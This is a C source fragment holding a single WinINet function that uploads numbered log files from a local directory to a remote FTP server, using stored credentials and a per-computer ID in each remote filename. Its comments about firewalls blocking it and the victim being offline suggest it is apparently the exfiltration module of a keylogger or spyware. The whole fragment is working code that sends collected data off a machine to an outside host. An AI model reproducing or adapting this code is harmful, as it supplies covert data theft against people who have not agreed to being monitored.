inline char UploadLog(unsigned long int no)
{
	/* this function will transfer the log 
	   files one by one to the FTP server */

	static BOOL semaphore = FALSE;
	if(semaphore == TRUE)
		return 0;
	else
		semaphore = TRUE;

	if(InternetCheckConnection(InternetCheckMask,FLAG_ICC_FORCE_CONNECTION,0))
	{
		/* connect me to the internet */
		HINTERNET hNet = InternetOpen(AppName2, PRE_CONFIG_INTERNET_ACCESS,
			NULL, INTERNET_INVALID_PORT_NUMBER, 0 );
		if(hNet != NULL)
		{
			/* connect me to the remote FTP Server */
			HINTERNET hFtp = InternetConnect(hNet,FtpServer,
				INTERNET_DEFAULT_FTP_PORT,FtpUserName,FtpPassword,
				INTERNET_SERVICE_FTP, 0, 0);
			if(hFtp != NULL)
			{
				/* successful connection to FTP server established */
				char local_file[MAX_PATH], remote_file[MAX_PATH];
				sprintf(local_file,"%s%lX%s",BaseDirectory,no,STRING_LOGEXT);
				sprintf(remote_file,"%lu-%lX%s",GetCompId(hFtp),no,STRING_SRVEXT);
				//MessageBox(NULL,local_file,remote_file,0);
				if(FtpPutFile(hFtp, local_file, remote_file, 0, 0))
				{
					/* file transfer OK */
					InternetCloseHandle(hFtp);
					InternetCloseHandle(hNet);
					semaphore = FALSE;
					return 1;
				}
				else {
					/* file transfer failed */
					InternetCloseHandle(hFtp);
					InternetCloseHandle(hNet);
					semaphore = FALSE;
					return 0;
				}
			}
			else {
				/* connection to FTP server failed */
				InternetCloseHandle(hNet);
				semaphore = FALSE;
				return 0;
			}
		}
		else {
			/* connection to internet failed */
			semaphore = FALSE;
			return 0;
		}
	}
	/* internet connection is not available 
	   either because the person is not online
	   or because a firewall has blocked me */
	semaphore = FALSE;
	return 0;
}